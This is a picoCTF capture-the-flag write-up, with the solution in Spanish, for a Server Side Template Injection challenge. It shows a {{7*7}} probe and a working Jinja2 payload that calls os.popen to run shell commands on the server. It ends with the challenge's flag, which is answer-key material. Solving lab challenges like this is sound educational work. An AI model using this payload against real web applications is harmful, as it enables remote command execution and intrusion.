I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:55768/)!

Hints:
 1. Server Side Template Injection

## Solución:
Revisamos si existe la vulnerabilidad simple con un ejemplo como {{7 * 7}} , al ver que nos arroja el resultado de la multiplicación, vemos que existe la vulnerabilidad, entonces al ingresar el siguiente comando:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

Obtenemos la flag:
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
```